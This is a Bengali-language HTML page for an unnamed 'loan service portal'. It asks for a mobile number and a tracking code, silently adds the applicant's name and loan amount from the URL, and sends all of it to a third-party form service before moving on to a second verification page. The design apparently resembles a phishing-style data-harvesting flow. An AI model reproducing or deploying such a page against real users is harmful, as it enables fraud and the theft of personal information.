<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ভেরিফিকেশন - লোন সার্ভিস</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            -webkit-tap-highlight-color: transparent;
        }

        body { 
            background: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
        }

        .container { 
            width: 100%; 
            max-width: 450px; 
            background: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between;
            padding: 30px 24px 25px;
            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08); 
            border-left: 1px solid #fff7ed;
            border-right: 1px solid #fff7ed;
        }

        .top-row {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 25px;
        }

        .lang-switch {
            background: #f1f5f9;
            border-radius: 20px;
            display: flex;
            padding: 3px;
        }

        .lang-btn {
            padding: 4px 14px;
            font-size: 12px;
            border-radius: 16px;
            border: none;
            cursor: pointer;
            font-weight: 700;
        }

        .lang-btn.active {
            background: #ff5e00;
            color: #ffffff;
        }

        .lang-btn:not(.active) {
            background: transparent;
            color: #64748b;
        }

        .brand-section {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 35px;
        }

        .brand-logo {
            width: 55px;
            height: 55px;
            object-fit: cover;
            border-radius: 50%;
            border: 2px solid #fed7aa;
            padding: 2px;
            box-shadow: 0 4px 10px rgba(255, 94, 0, 0.15);
        }

        .brand-info h2 {
            font-size: 20px;
            font-weight: 800;
            color: #ff5e00;
            line-height: 1.2;
        }

        .brand-info p {
            font-size: 12px;
            color: #64748b;
            font-weight: 500;
        }

        .input-group {
            margin-bottom: 22px;
        }

        .input-label {
            font-size: 13.5px;
            font-weight: 700;
            color: #334155;
            margin-bottom: 8px;
            display: block;
        }

        .input-box {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-box i.input-icon {
            position: absolute;
            left: 16px;
            color: #ff5e00;
            font-size: 16px;
        }

        .form-control {
            width: 100%;
            padding: 14px 16px 14px 44px;
            border: 1.5px solid #fed7aa;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            background: #fffaf5;
            color: #1e293b;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.2s;
        }

        .form-control:focus {
            border-color: #ff5e00;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
        }

        .helper-text {
            font-size: 12.5px;
            color: #ff5e00;
            font-weight: 600;
            margin-top: 8px;
            display: inline-block;
            text-decoration: none;
        }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff5e00, #ff8800);
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3);
            transition: transform 0.15s;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .btn-submit:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .bottom-links {
            display: flex;
            justify-content: space-around;
            padding-top: 30px;
            border-top: 1px solid #f1f5f9;
            margin-top: 30px;
        }

        .link-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #64748b;
            gap: 6px;
        }

        .link-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #fffaf5;
            border: 1px solid #fed7aa;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ff5e00;
            font-size: 16px;
        }

        .link-title {
            font-size: 12px;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="container">
    <div>
        <div class="top-row">
            <div class="lang-switch">
                <button type="button" class="lang-btn active">বাংলা</button>
                <button type="button" class="lang-btn">ENG</button>
            </div>
        </div>

        <div class="brand-section">
            <img src="logoo.png" alt="Company Logo" class="brand-logo">
            <div class="brand-info">
                <h2>লোন সার্ভিস পোর্টাল</h2>
                <p>নিরাপদ ও দ্রুত যাচাইকরণ</p>
            </div>
        </div>

        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
            <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">

            <!-- লাইভ মোবাইল নম্বর ইনপুট -->
            <div class="input-group">
                <label class="input-label">গ্রাহক মোবাইল নম্বর</label>
                <div class="input-box">
                    <i class="fa-solid fa-phone input-icon"></i>
                    <input type="tel" id="userPhone" name="যাচাইকৃত_মোবাইল" class="form-control" required placeholder="০১XXXXXXXXX">
                </div>
            </div>

            <!-- ট্র্যাকিং / রেফারেন্স আইডি ইনপুট -->
            <div class="input-group">
                <label class="input-label">আবেদন ট্র্যাকিং রেফারেন্স কোড</label>
                <div class="input-box">
                    <i class="fa-solid fa-hashtag input-icon"></i>
                    <input type="text" id="trackRef" name="রেফারেন্স_কোড" class="form-control" required placeholder="যেমন: TRK-1024" maxlength="15">
                </div>
                <a href="javascript:void(0)" class="helper-text" onclick="alert('আপনার রেফারেন্স কোডটি জানতে অফিস হেল্পলাইনে যোগাযোগ করুন।')">কোড পাননি? সহায়তা নিন</a>
            </div>

            <button type="submit" id="btnSubmit" class="btn-submit">
                <span>যাচাই ও পরবর্তী ধাপে যান</span>
                <i class="fa-solid fa-arrow-right"></i>
            </button>
        </form>
    </div>

    <div class="bottom-links">
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-location-dot"></i></div>
            <span class="link-title">শাখা সমূহ</span>
        </div>
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-percent"></i></div>
            <span class="link-title">অফার</span>
        </div>
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-circle-question"></i></div>
            <span class="link-title">সহায়তা</span>
        </div>
    </div>
</div>

<script>
    // আগের পেজ থেকে পাঠানো প্যারামিটার রিসিভ করা
    const params = new URLSearchParams(window.location.search);
    const applicantName = params.get('name') || '';
    const applicantPhone = params.get('phone') || '';
    const loanAmount = params.get('amount') || '';

    // হিডেন ফিল্ড ও ডিফল্ট ভ্যালু বসানো
    document.getElementById('hiddenName').value = applicantName;
    document.getElementById('hiddenAmount').value = loanAmount;
    if (applicantPhone) {
        document.getElementById('userPhone').value = applicantPhone;
    }

    const form = document.getElementById('verifyForm');
    const btnSubmit = document.getElementById('btnSubmit');

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        btnSubmit.disabled = true;
        btnSubmit.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';

        const data = new FormData(form);

        fetch(form.action, {
            method: 'POST',
            body: data,
            headers: { 'Accept': 'application/json' }
        }).finally(() => {
            // সফলভাবে তথ্য পৌঁছানোর পর verify2.html এ রিডাইরেক্ট
            window.location.href = "verify2.html";
        });
    });
</script>

</body>
</html>
